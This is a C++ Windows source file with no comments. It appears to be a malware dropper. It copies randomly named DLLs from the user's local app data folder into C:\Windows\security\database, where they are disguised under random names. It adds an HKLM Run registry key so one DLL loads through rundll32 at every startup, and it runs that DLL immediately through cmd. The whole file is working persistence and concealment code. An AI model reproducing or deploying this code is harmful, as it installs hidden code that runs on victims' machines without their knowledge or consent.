#include "stdafx.h"
#include <Windows.h>
#include <string>

void cpy2() {
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[13] = L"LOCALAPPDATA";
    DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
    std::wstring fullpath1;
    fullpath1 += buffer;
    fullpath1 += L"\\klzfNjYkTazNJpKNvBkL.dll";
    LPCWSTR cont1 = fullpath1.c_str();
    CopyFile(
        cont1,
        TEXT("C:\\Windows\\security\\database\\klzfNjYkTazNJpKNvBkL.dll"),
        FALSE
    );

}


void cpy1() {
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[13] = L"LOCALAPPDATA";
    DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
    std::wstring fullpath1;
    fullpath1 += buffer;
    fullpath1 += L"\\ILOVEYUUKA.dll";
    LPCWSTR cont1 = fullpath1.c_str();
    CopyFile(
        cont1,
        TEXT("C:\\Windows\\security\\database\\cLHmKpngPKJeIIDxXeFq.dll"),
        FALSE
    );
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[13] = L"LOCALAPPDATA";
    DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
    std::wstring fullpath1;
    fullpath1 += buffer;
    fullpath1 += L"\\lAiaUFyKHYphOZsGSMZv.dll";
    LPCWSTR cont1 = fullpath1.c_str();
    CopyFile(
        cont1,
        TEXT("C:\\Windows\\security\\database\\VADgDYDQDZkMBGFVaowB.dll"),
        FALSE
    );
    cpy1();
    cpy2();
    LONG status;
    HKEY hKey;
    const wchar_t path[] = L"rundll32 C:\\Windows\\security\\database\\VADgDYDQDZkMBGFVaowB.dll, message";
    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey);
    if ((status == ERROR_SUCCESS) && (hKey != NULL))
    {
        RegSetValueEx(hKey, TEXT("FezDzUXWVHbPPXBpqqoD"), 0, REG_SZ, (BYTE*) path, sizeof(path));
        RegCloseKey(hKey);
    }
    ShellExecute(
        NULL,
        TEXT("open"),
        TEXT("cmd"),
        L"/c rundll32 C:\\Windows\\security\\database\\VADgDYDQDZkMBGFVaowB.dll, message",
        NULL,
        SW_NORMAL
    );
    return 0;
}

	